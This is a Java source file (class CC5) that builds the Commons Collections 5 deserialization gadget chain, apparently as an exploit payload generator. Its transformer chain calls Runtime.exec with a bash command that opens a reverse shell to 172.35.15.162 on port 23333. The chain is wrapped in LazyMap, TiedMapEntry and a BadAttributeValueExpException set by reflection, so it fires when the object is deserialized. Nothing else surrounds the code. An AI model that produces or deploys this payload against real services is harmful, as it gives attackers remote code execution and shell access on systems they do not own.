import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static Object getObj() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(java.lang.Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/172.35.15.162/23333 0>&1"}}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap<String, String>();

        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "placeholder");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("placeholder");
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        return badAttributeValueExpException;
    }
}